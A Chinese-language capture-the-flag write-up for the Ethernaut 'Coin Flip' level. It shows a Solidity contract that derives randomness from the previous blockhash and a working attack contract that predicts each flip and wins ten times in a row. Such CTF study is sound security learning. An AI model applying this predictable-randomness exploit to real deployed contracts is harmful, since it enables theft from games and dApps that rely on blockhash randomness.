### 第四关 Coin Flip
### 难度2/5
## 这一关的通关条件是连续10次赌赢硬币的结果。
## 代码如下：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```
根据概率论，可以知道连续十次猜对true或者false的概率为P = (0.5)^{10}，即1/1024。这显然花光gas都不能连续十次猜对。但是在区块链上是没有真正意义的随机数的，所以这题的解题思路就是写一个攻击合约在每次调用flip()函数前就计算出side的值，这样就能每次都猜对了。
## 解题步骤：
1. 打开remix线上编辑器,新建攻击合约：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlip {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address levelInstance;

  constructor(address _levelInstance) {
      levelInstance = _levelInstance;
  }

  function attack() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    if (side == true) {
        ICoinFlip(levelInstance).flip(true);
    } else {
        ICoinFlip(levelInstance).flip(false);
    }
  }
}
```
2. 连续调用10次，可以在控制台查看目前consecutiveWins的值：
```javascript
await contract.consecutiveWins()
```
3. 提交过关。
